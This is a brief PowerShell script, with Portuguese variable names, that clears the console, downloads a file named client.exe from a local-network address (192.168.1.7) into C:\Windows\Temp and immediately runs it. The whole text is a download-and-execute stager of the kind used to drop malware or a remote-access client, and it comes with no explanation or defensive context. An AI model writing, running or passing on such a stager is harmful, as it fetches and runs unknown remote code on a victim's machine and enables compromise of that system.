$Arquivo = "client.exe"
$End = "http://192.168.1.7/$Arquivo"

Clear-Host

(New-Object System.Net.WebClient).DownloadFile($End,"C:\Windows\Temp\$Arquivo")
Start-Process ("C:\Windows\Temp\$Arquivo")
